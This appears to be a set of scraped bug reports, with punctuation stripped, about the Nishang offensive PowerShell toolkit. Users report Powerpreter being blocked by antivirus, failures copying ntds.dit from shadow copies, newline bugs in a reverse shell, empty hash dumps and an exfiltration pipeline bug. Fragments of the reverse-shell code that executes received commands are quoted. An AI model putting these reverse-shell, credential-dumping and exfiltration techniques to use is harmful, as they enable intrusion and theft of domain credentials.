Im trying to import powerpreter from the file directory with ImportModule Powerpreterpsm but I get the error At C users desktop desktop nishangmaster powerpreter Powerpreterpsm char This script contains malicious content and has been blocked by your antivirus software CategoryInfo ParserError ParentContainsErrorRecordException FullyQualifiedErrorId ScriptContainedMaliciousContent ImportModule The specified module Powerpreterpsm was not loaded because no valid module file was found in any module directory At line char ImportModule Powerpreterpsm CategoryInfo ResourceUnavailable Powerpreterpsm String ImportModule FileNotFoundException FullyQualifiedErrorId ModulesModuleNotFoundMicrosoftPowerShellCommandsImportModuleCommand Im running as administrator and execution policy unrestricted and I have turned off AV What can I be doing wrong Thanks I noticed that when passing a path to the NTDSdit file using the ntdsSource argument it fails when trying to copy from the shadow Take for instance the supplied example CopyVSS DestinationDir C temp ntdsSource D ntds ntdsdit This fails with the following The filename directory name or volume label syntax is incorrect This due to the script first making a copy of the C drive GetWmiObject list win shadowcopyCreateC ClientAccessible Then later it tries to copy from the supplies ntdsSource which by using example above will look like this copy GLOBALROOT Device HarddiskVolumeShadowCopy ID D ntds ntdsdit This fails because of two things The supplied shadow copy is of the C drive The path passed to copy should not include drive letter I guess there should be some check if the supplied ntdsSource is on the C drive and if not there needs to be taken a separate shadow copy of that Further the ntdsSource variable needs to be modified so the drive letter is removed so that the command becomes copy GLOBALROOT Device HarddiskVolumeShadowCopy ID ntds ntdsdit I ended up running the commands manually which doesnt take much effort Just a heads up change to utf encoding to display chinese The InvokePowerShellTcpOneLineps reverse shell prints new lines between successive lines for eg the ls command Im using netcat as the listener to which the shell connects Ive looked at the code and I cant seem to locate the issue client NewObject SystemNetSocketsTCPClient stream clientGetStream byte bytes whilei streamReadbytes bytesLength ne data NewObject TypeName SystemTextASCIIEncodingGetStringbytes isendback iex data OutString sendback sendback PS pwdPath sendbyte textencoding ASCIIGetBytessendback streamWritesendbyte sendbyteLengthstreamFlushclientClose kali linux How could it be fixed Furthermore using commands like net users domain only returns the The request will be processed at a domain controller for domain intermediary response and not the full response from the domain controller GetPassHashes does not work on Windows It always returns empty LMNTLM hashes on execution I attached a screenshot that shows the problem on a test machine On the left side is the output from GetPassHashes on the right side is the correct output from mimikatz capture Doexfiltration is unable to handle the pipeline input properly It exfiltrates only the last object returned from the command Currently the pipeline should not be used with DoExfiltration instead use as below DoExfiltration Data GetProcess ExfilOption Webserver URL 